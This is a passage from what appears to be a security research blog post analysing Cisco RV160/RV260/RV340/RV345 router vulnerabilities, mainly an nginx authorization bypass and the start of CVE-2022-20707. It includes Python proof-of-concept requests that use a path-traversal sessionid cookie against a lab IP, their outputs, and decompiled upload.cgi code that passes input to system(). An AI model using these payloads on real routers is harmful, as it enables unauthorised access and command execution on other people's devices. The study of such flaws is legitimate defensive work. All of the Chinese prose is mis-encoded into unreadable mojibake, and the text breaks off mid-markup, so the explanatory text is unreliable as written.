RV160ã€RV260ã€RV340 å’Œ RV345 ç³»åˆ—è·¯ç”±å™¨ä¸­çš„å¤šä¸ªæ¼æ´å¯èƒ½å…è®¸æ”»å‡»è€…æ‰§è¡Œä»¥ä¸‹ä»»ä½•æ“ä½œï¼š<strong>æ‰§è¡Œä»»æ„ä»£ç ã€æå‡æƒé™ã€æ‰§è¡Œä»»æ„å‘½ä»¤ã€ç»•è¿‡èº«ä»½éªŒè¯å’Œæˆæƒä¿æŠ¤ã€è·å–å¹¶è¿è¡Œæœªç­¾åçš„è½¯ä»¶ã€å¯¼è‡´æ‹’ç»æœåŠ¡ (DoS)</strong> </p><p>è¯¥CVEä¸»è¦æ˜¯åˆ©ç”¨äº†nginxé…ç½®ä¸æ°å½“å¯¼è‡´çš„æˆæƒç»•è¿‡æ¼æ´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">location /form-file-upload &#123;</span><br><span class="line">    include uwsgi_params;</span><br><span class="line">    proxy_buffering off;</span><br><span class="line">    uwsgi_modifier1 9;</span><br><span class="line">    uwsgi_pass 127.0.0.1:9003;</span><br><span class="line">    uwsgi_read_timeout 3600;</span><br><span class="line">    uwsgi_send_timeout 3600;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location /upload &#123;</span><br><span class="line">    set $deny 1;</span><br><span class="line"></span><br><span class="line">        if (-f /tmp/websession/token/$cookie_sessionid) &#123;</span><br><span class="line">                set $deny &quot;0&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if ($deny = &quot;1&quot;) &#123;</span><br><span class="line">                return 403;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    upload_pass /form-file-upload;</span><br><span class="line">    upload_store /tmp/upload;</span><br><span class="line">    upload_store_access user:rw group:rw all:rw;</span><br><span class="line">    upload_set_form_field $upload_field_name.name &quot;$upload_file_name&quot;;</span><br><span class="line">    upload_set_form_field $upload_field_name.content_type &quot;$upload_content_type&quot;;</span><br><span class="line">    upload_set_form_field $upload_field_name.path &quot;$upload_tmp_path&quot;;</span><br><span class="line">    upload_aggregate_form_field &quot;$upload_field_name.md5&quot; &quot;$upload_file_md5&quot;;</span><br><span class="line">    upload_aggregate_form_field &quot;$upload_field_name.size&quot; &quot;$upload_file_size&quot;;</span><br><span class="line">    upload_pass_form_field &quot;^.*$&quot;;</span><br><span class="line">    upload_cleanup 400 404 499 500-505;</span><br><span class="line">    upload_resumable on;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸º$cookie_sessionidå¯æ§ï¼Œæ‰€ä»¥å¯ä»¥å°†å…¶æŒ‡å‘..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwdï¼Œå°±å¯ä»¥ç»•è¿‡ç™»å½•ã€‚è¯¥é—®é¢˜äº§ç”Ÿçš„æ ¹æœ¬åŸå› åœ¨äº($cookie_sessionidå¯æ§å¯¼è‡´ç›®å½•ç©¿è¶Š)</p><p>å†™ä¸ªPocæµ‹è¯•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&#x27;https://192.168.121.128/upload&#x27;</span><br><span class="line">headers_1=&#123;&#x27;Cookie&#x27;:&#x27;sessionid=cyberangel&#x27;&#125;                 # éæ³•çš„sessionid</span><br><span class="line">headers_2=&#123;&#x27;Cookie&#x27;:&#x27;sessionid=../../../etc/passwd&#x27;&#125;        # ä¼ªé€ çš„sessionid</span><br><span class="line">r_1 = requests.post(url,headers=headers_1,verify=False)</span><br><span class="line">r_2 = requests.post(url,headers=headers_2,verify=False)</span><br><span class="line">print(r_1.text)</span><br><span class="line">print(&quot;-&quot;*50)</span><br><span class="line">print(r_2.text)</span><br><span class="line">r_1.close()</span><br><span class="line">r_2.close()</span><br><span class="line">~/fr/_/_/_f/_/_openwrt-comcerto2000-hgw-r/ubifs-root/1161918421 --------------------------------------------------------------</span><br><span class="line">&gt; python3 test1.py                                                                                   </span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body bgcolor=&quot;white&quot;&gt;</span><br><span class="line">&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">--------------------------------------------------</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;400 Bad Request&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body bgcolor=&quot;white&quot;&gt;</span><br><span class="line">&lt;center&gt;&lt;h1&gt;400 Bad Request&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°æ¢äº†ä¸€ç§æŠ¥é”™ï¼Œè¯´æ˜å°±æ˜¯ç»•è¿‡å»äº†ï¼Œä½†æ˜¯åç»­è¿˜æœ‰æ£€æŸ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload_pass /form-file-upload;</span><br></pre></td></tr></table></figure><p>æŒ‡å®šå½“æ–‡ä»¶ä¸Šä¼ å®Œæˆåï¼Œå°†è¯·æ±‚è½¬å‘åˆ° <code>/form-file-upload</code> è·¯å¾„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">location /form-file-upload &#123;</span><br><span class="line">    include uwsgi_params;</span><br><span class="line">    proxy_buffering off;</span><br><span class="line">    uwsgi_modifier1 9;</span><br><span class="line">    uwsgi_pass 127.0.0.1:9003;</span><br><span class="line">    uwsgi_read_timeout 3600;</span><br><span class="line">    uwsgi_send_timeout 3600;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨äº†uwsgi_paramsï¼Œé€šè¿‡127.0.0.1:9003ï¼Œå…¨å±€æœç´¢ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[uwsgi]</span><br><span class="line">plugins = cgi</span><br><span class="line">workers = 1</span><br><span class="line">master = 1</span><br><span class="line">uid = www-data</span><br><span class="line">gid = www-data</span><br><span class="line">socket=127.0.0.1:9003</span><br><span class="line">buffer-size=4096</span><br><span class="line">cgi = /www/cgi-bin/upload.cgi</span><br><span class="line">cgi-allowed-ext = .cgi</span><br><span class="line">cgi-allowed-ext = .pl</span><br><span class="line">cgi-timeout = 300</span><br><span class="line">ignore-sigpipe = true</span><br></pre></td></tr></table></figure><p>è°ƒç”¨upload.cgiå¯¹å…¶è¿›è¡Œå¤„ç†ï¼Œåˆ†æupload.cgi</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">if ( httpCookieEnv )</span><br><span class="line"> &#123;</span><br><span class="line">   StrBufSetStr(parsedCookieBuffer, httpCookieEnv);</span><br><span class="line">   httpCookieEnv = 0;</span><br><span class="line">   cookieValue = (char *)StrBufToStr(parsedCookieBuffer);</span><br><span class="line">   for ( parsedToken = strtok_r(cookieValue, &quot;;&quot;, &amp;strtokSavePtr);</span><br><span class="line">         parsedToken;</span><br><span class="line">         parsedToken = strtok_r(0, &quot;;&quot;, &amp;strtokSavePtr) )// strtokå¯¹æ¯ä¸€ä¸ª;è¿›è¡Œåˆ‡å‰²ï¼Œå¹¶ä¼ é€’;å‰çš„å‚æ•°</span><br><span class="line">   &#123;</span><br><span class="line">     sessionIdPtr = strstr(parsedToken, &quot;sessionid=&quot;);// æ‰¾åˆ°;sessionid=</span><br><span class="line">     if ( sessionIdPtr )</span><br><span class="line">       httpCookieEnv = sessionIdPtr + 10;      // è¿™æ˜¯sessionid=valueçš„value</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>æ­¤å¤„ä»httpCookieå¯»æ‰¾;sessionid&#x3D;value</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">else if ( !strcmp(requestUriEnv, &quot;/upload&quot;)</span><br><span class="line">       &amp;&amp; httpCookieEnv</span><br><span class="line">       &amp;&amp; strlen(httpCookieEnv) - 0x10 &lt;= 0x40// sessionidçš„é•¿åº¦&lt;=0x40</span><br><span class="line">       &amp;&amp; !match_regex(&quot;^[A-Za-z0-9+=/]*$&quot;, httpCookieEnv) )// æ­£åˆ™åŒ¹é…ï¼Œå­—æ¯å’Œæ•°å­—</span><br><span class="line">&#123;</span><br><span class="line">  destinationParsed = parsedDestinationBuffer;</span><br><span class="line">  uploadOption = parsedOptionBuffer;</span><br><span class="line">  parameterType = parsedFileTypeBuffer;</span><br><span class="line">  completeFileBufferPath = StrBufToStr(filePathWrapperBuffer);</span><br><span class="line">  sub_12684(</span><br><span class="line">    httpCookieEnv,</span><br><span class="line">    destinationParsed,</span><br><span class="line">    uploadOption,</span><br><span class="line">    parameterType,</span><br><span class="line">    completeFileBufferPath,</span><br><span class="line">    parsedCertNameBuffer,</span><br><span class="line">    parsedCertTypeBuffer,</span><br><span class="line">    parsedPasswordBuffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¦æ±‚å­˜åœ¨sessionidï¼Œå› æ­¤è¿˜è¦è®¾ç½®sessionid</p><p>å¦‚æ­¤ä¾¿å¯æœªæˆæƒä¸Šä¼ æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import request</span><br><span class="line">url=&#x27;https://192.168.121.128/upload&#x27;</span><br><span class="line">headers=&#123;&#x27;Cookie&#x27;:&#x27;sessionid=../../../etc/passwd;sessionid=&#x27;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202504062349438.png" alt="image-20250226195154748"></p><p>æµè§ˆå™¨cookieæ¡ç›®ä¸ºï¼šY2lzY28vMTkyLjE2OC4xMjEuMTM4LzIyMjA&#x3D;ï¼ˆbase64è§£ç ä¸ºcisco&#x2F;192.168.121.138&#x2F;2220ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">root@Router:~/rootfs/tmp/websession# cat session</span><br><span class="line">&#123;</span><br><span class="line">  &quot;max-count&quot;:1,</span><br><span class="line">  &quot;cisco&quot;:&#123;</span><br><span class="line">    &quot;Y2lzY28vMTkyLjE2OC4xMjEuMTM4LzIyMjA=&quot;:&#123;</span><br><span class="line">      &quot;user&quot;:&quot;cisco&quot;,</span><br><span class="line">      &quot;group&quot;:&quot;admin&quot;,</span><br><span class="line">      &quot;time&quot;:2344,</span><br><span class="line">      &quot;access&quot;:1,</span><br><span class="line">      &quot;timeout&quot;:1800,</span><br><span class="line">      &quot;leasetime&quot;:0</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;root@Router:~/rootfs/tmp/websession# cat ./token/Y2lzY28vMTkyLjE2OC4xMjEuMTM4LzIyMjA\= </span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">url=&#x27;https://192.168.121.128/upload&#x27;</span><br><span class="line">headers=&#123;&#x27;Cookie&#x27;:&#x27;sessionid=../../../etc/passwd;sessionid=Y2lzY28vMTkyLjE2OC4xMjEuMTM4LzIyMjA=;&#x27;&#125;</span><br><span class="line">r = requests.post(url,headers=headers,verify=False)</span><br><span class="line">print(r.text)</span><br><span class="line">~/fr/_/_/_f/_/_openwrt-comcerto2000-hgw-r/ubifs-root/1161918421 --------------------------------------------------------------</span><br><span class="line">&gt; python3 test2.py</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;400 Bad Request&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body bgcolor=&quot;white&quot;&gt;</span><br><span class="line">&lt;center&gt;&lt;h1&gt;400 Bad Request&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>è¿™æ—¶å€™ä»”ç»†åˆ†æupload.cgi</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if ( !parsedFilePathBuffer )</span><br><span class="line"> &#123;</span><br><span class="line">   puts(&quot;Content-type: text/html\n&quot;);</span><br><span class="line">   printf(&quot;Error Input&quot;);</span><br><span class="line">   goto LABEL_36;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªåœ°æ–¹å¾—è·³è¿‡ï¼Œå› æ­¤file.pathéœ€å­˜åœ¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall sub_115D0(const char *a1, const char *a2, const char *a3)</span><br><span class="line">&#123;</span><br><span class="line">  bool v3; // zf</span><br><span class="line">  const char *v8; // r4</span><br><span class="line">  int v9; // r4</span><br><span class="line">  char s[316]; // [sp+Ch] [bp-13Ch] BYREF</span><br><span class="line"></span><br><span class="line">  v3 = a3 == 0;</span><br><span class="line">  if ( a3 )</span><br><span class="line">    v3 = a1 == 0;</span><br><span class="line">  if ( v3 )</span><br><span class="line">    return -1;</span><br><span class="line">  if ( !strcmp(a1, &quot;Firmware&quot;) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = &quot;/tmp/firmware&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( !strcmp(a1, &quot;Configuration&quot;) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = &quot;/tmp/configuration&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( !strcmp(a1, &quot;Certificate&quot;) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = &quot;/tmp/in_certs&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( !strcmp(a1, &quot;Signature&quot;) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = &quot;/tmp/signature&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( !strcmp(a1, &quot;3g-4g-driver&quot;) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = &quot;/tmp/3g-4g-driver&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( !strcmp(a1, &quot;Language-pack&quot;) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = &quot;/tmp/language-pack&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( !strcmp(a1, &quot;User&quot;) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = &quot;/tmp/user&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    if ( strcmp(a1, &quot;Portal&quot;) )</span><br><span class="line">      return -1;</span><br><span class="line">    v8 = &quot;/tmp/www&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( !is_file_exist(a2) )</span><br><span class="line">    return -2;</span><br><span class="line">  if ( strlen(a2) &gt; 0x80 || strlen(a3) &gt; 0x80 )</span><br><span class="line">    return -3;</span><br><span class="line">  if ( match_regex((int)&quot;^[a-zA-Z0-9_.-]*$&quot;, (int)a3) )</span><br><span class="line">    return -4;</span><br><span class="line">  sprintf(s, &quot;mv -f %s %s/%s&quot;, a2, v8, a3);</span><br><span class="line">  debug(&quot;cmd=%s&quot;, s);</span><br><span class="line">  if ( !s[0] )</span><br><span class="line">    return -1;</span><br><span class="line">  v9 = system(s);</span><br><span class="line">  if ( v9 &lt; 0 )</span><br><span class="line">    error((int)&quot;upload.cgi: %s(%d) Upload failed!&quot;, (int)&quot;prepare_file&quot;, (const char *)0xB3);</span><br><span class="line">  return v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ˜¯ä¸Šä¼ æ–‡ä»¶çš„é€»è¾‘ï¼Œå› æ­¤a1å’Œa3ä¹Ÿå¾—å­˜åœ¨ï¼Œå³pathparamå’Œfileparam</p><h2 id="CVE-2022-20707"><a href="#CVE-2022-20707" class="headerlink" title="CVE-2022-20707"></a>CVE-2022-20707</h2><p>ä¸€äº›å‡½æ•°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall json_object_object_add(int a1, const char *a2, int a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v6; // r0</span><br><span class="line">  int v7; // r4</span><br><span class="line">  int v8; // r4</span><br><span class="line">  char *v9; // r0</span><br><span class="line">  int result; // r0</span><br><span class="line"></span><br><span class="line">  v6 = j_lh_table_lookup_entry(*(_DWORD *)(a1 + 24));</span><br><span class="line">  v7 = v6;</span><br><span class="line">  if ( v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(_DWORD *)(v6 + 4);</span><br><span class="line">    if ( result )</span><br><span class="line">      result = j_json_object_put();</span><br><span class="line">    *(_DWORD *)(v7 + 4) = a3;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = *(_DWORD *)(a1 + 24);</span><br><span class="line">    v9 = strdup(a2);</span><br><span class="line">    return j_lh_table_insert(v8, (int)v9, a3);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>è¿™æ®µä»£ç æ˜¯ä¸€ä¸ªç”¨äºå‘ JSON å¯¹è±¡ä¸­æ·»åŠ é”®å€¼å¯¹çš„å‡½æ•°ã€‚å®ƒä½¿ç”¨äº†ä¸€ä¸ªå“ˆå¸Œè¡¨æ¥å­˜å‚¨å¯¹è±¡çš„é”®å€¼å¯¹ã€‚ä»¥ä¸‹æ˜¯å¯¹ä»£ç çš„è¯¦ç»†åˆ†æï¼š</p><p><strong>å‚æ•°</strong>ï¼š</p><ul><li><code>a1</code>ï¼šè¡¨ç¤º JSON å¯¹è±¡çš„æŒ‡é’ˆã€‚</li><li><code>a2</code>ï¼šè¡¨ç¤ºè¦æ·»åŠ çš„é”®ã€‚</li><li><code>a3</code>ï¼šè¡¨ç¤ºè¦æ·»åŠ çš„å€¼ã€‚</li></ul></blockquote><p>åœ¨sub_12684ä¸­ï¼Œå¦‚æœä¼ å…¥çš„æ–‡ä»¶ç±»å‹æ˜¯Firmwareï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall sub_117E0(int destination, int fileparam, int uploadOption)</span><br><span class="line">&#123;</span><br><span class="line">  bool isZeroFlag; // zf</span><br><span class="line">  int jsonObjRpc; // r5</span><br><span class="line">  int jsonObjParams; // r4</span><br><span class="line">  int jsonObjInput; // r7</span><br><span class="line">  int jsonObjSource; // r10</span><br><span class="line">  int jsonObjDestination; // r8</span><br><span class="line">  int jsonStrRpcVersion; // r0</span><br><span class="line">  int jsonStrMethod; // r0</span><br><span class="line">  int jsonStrRpcAction; // r0</span><br><span class="line">  int jsonStrFileType; // r0</span><br><span class="line">  int locationUrlStr; // r0</span><br><span class="line">  int jsonStrLocationUrl; // r0</span><br><span class="line">  int jsonStrFirmwareState; // r0</span><br><span class="line">  int jsonStrRebootType; // r0</span><br><span class="line">  int jsonObjFirmwareOption; // [sp+4h] [bp-34h]</span><br><span class="line">  int strBuf; // [sp+Ch] [bp-2Ch] BYREF</span><br><span class="line"></span><br><span class="line">  isZeroFlag = fileparam == 0;</span><br><span class="line">  if ( fileparam )</span><br><span class="line">    isZeroFlag = destination == 0;</span><br><span class="line">  if ( isZeroFlag )</span><br><span class="line">    return 0;</span><br><span class="line">  if ( !uploadOption )</span><br><span class="line">    return 0;</span><br><span class="line">  jsonObjRpc = json_object_new_object();</span><br><span class="line">  jsonObjParams = json_object_new_object();</span><br><span class="line">  jsonObjInput = json_object_new_object();</span><br><span class="line">  jsonObjSource = json_object_new_object();</span><br><span class="line">  jsonObjDestination = json_object_new_object();</span><br><span class="line">  jsonObjFirmwareOption = json_object_new_object();</span><br><span class="line">  strBuf = StrBufCreate();</span><br><span class="line">  StrBufSetStr(strBuf, &quot;FILE://Firmware/&quot;);</span><br><span class="line">  StrBufAppendStr(strBuf, fileparam);</span><br><span class="line">  jsonStrRpcVersion = json_object_new_string(&quot;2.0&quot;);</span><br><span class="line">  json_object_object_add(jsonObjRpc, (int)&quot;jsonrpc&quot;, jsonStrRpcVersion);</span><br><span class="line">  jsonStrMethod = json_object_new_string(&quot;action&quot;);</span><br><span class="line">  json_object_object_add(jsonObjRpc, (int)&quot;method&quot;, jsonStrMethod);</span><br><span class="line">  json_object_object_add(jsonObjRpc, (int)&quot;params&quot;, jsonObjInput);</span><br><span class="line">  jsonStrRpcAction = json_object_new_string(&quot;file-copy&quot;);</span><br><span class="line">  json_object_object_add(jsonObjInput, (int)&quot;rpc&quot;, jsonStrRpcAction);</span><br><span class="line">  json_object_object_add(jsonObjInput, (int)&quot;input&quot;, jsonObjParams);</span><br><span class="line">  jsonStrFileType = json_object_new_string(&quot;firmware&quot;);</span><br><span class="line">  json_object_object_add(jsonObjParams, (int)&quot;fileType&quot;, jsonStrFileType);</span><br><span class="line">  json_object_object_add(jsonObjParams, (int)&quot;source&quot;, jsonObjSource);</span><br><span class="line">  locationUrlStr = StrBufToStr(strBuf);</span><br><span class="line">  jsonStrLocationUrl = json_object_new_string(locationUrlStr);</span><br><span class="line">  json_object_object_add(jsonObjSource, (int)&quot;location-url&quot;, jsonStrLocationUrl);</span><br><span class="line">  json_object_object_add(jsonObjParams, (int)&quot;destination&quot;, jsonObjDestination);</span><br><span class="line">  jsonStrFirmwareState = json_object_new_string(destination);</span><br><span class="line">  json_object_object_add(jsonObjDestination, (int)&quot;firmware-state&quot;, jsonStrFirmwareState);</span><br><span class="line">  json_object_object_add(jsonObjParams, (int)&quot;firmware-option&quot;, jsonObjFirmwareOption);</span><br><span class="line">  jsonStrRebootType = json_object_new_string(uploadOption);</span><br><span class="line">  json_object_object_add(jsonObjFirmwareOption, (int)&quot;reboot-type&quot;, jsonStrRebootType);</span><br><span class="line">  StrBufFree(&amp;strBuf);</span><br><span class="line">  return jsonObjRpc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç®€å•åˆ†æå¾—å‡ºjsonObjRpcæ˜¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span 